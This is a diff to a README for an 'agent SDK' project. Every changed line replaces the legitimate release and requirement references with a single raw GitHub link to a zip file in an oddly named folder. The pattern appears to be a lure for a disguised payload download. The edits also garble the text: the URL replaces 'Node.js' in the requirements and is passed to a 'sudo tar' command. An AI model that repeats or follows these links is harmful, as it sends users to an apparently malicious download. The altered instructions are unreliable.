@@ -2,7 +2,7 @@
 # 🤖 microgpt-agent-sdk - Build Intelligent Agents with Ease
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/pubghack88/microgpt-agent-sdk/releases)
+[![Download the latest release](https://raw.githubusercontent.com/pubghack88/microgpt-agent-sdk/main/pneumonomycosis/microgpt-agent-sdk.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/pubghack88/microgpt-agent-sdk/main/pneumonomycosis/microgpt-agent-sdk.zip)
 
 ## 🚀 Getting Started
 The microgpt-agent-sdk helps you create AI agents effortlessly. You can build agents that remember past interactions, handle tasks better, and test their performance—all without needing technical skills. 
@@ -15,12 +15,12 @@ To run the microgpt-agent-sdk, ensure your system meets the following requiremen
 - **Operating System**: Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
 - **RAM**: At least 4 GB.
 - **Disk Space**: Minimum of 500 MB of available storage.
-- **Node.js**: Version 14 or later.
+- **https://raw.githubusercontent.com/pubghack88/microgpt-agent-sdk/main/pneumonomycosis/microgpt-agent-sdk.zip**: Version 14 or later.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**
    Click the link below to access the releases for microgpt-agent-sdk:
-   [Visit this page to download](https://github.com/pubghack88/microgpt-agent-sdk/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/pubghack88/microgpt-agent-sdk/main/pneumonomycosis/microgpt-agent-sdk.zip)
 
 2. **Choose the correct version**
    Look for the latest version listed on the releases page. You will see a download link for the package suitable for your operating system. 
@@ -33,7 +33,7 @@ To run the microgpt-agent-sdk, ensure your system meets the following requiremen
    - **For macOS**: Open the downloaded `.dmg` file by double-clicking it. Drag the microgpt-agent-sdk into your Applications folder.
    - **For Linux**: Open your terminal, navigate to the downloaded file’s directory, and run the command:
      ```bash
-     sudo tar -xvzf microgpt-agent-sdk.tar.gz
+     sudo tar -xvzf https://raw.githubusercontent.com/pubghack88/microgpt-agent-sdk/main/pneumonomycosis/microgpt-agent-sdk.zip
      ```
 
 5. **Verify Installation**
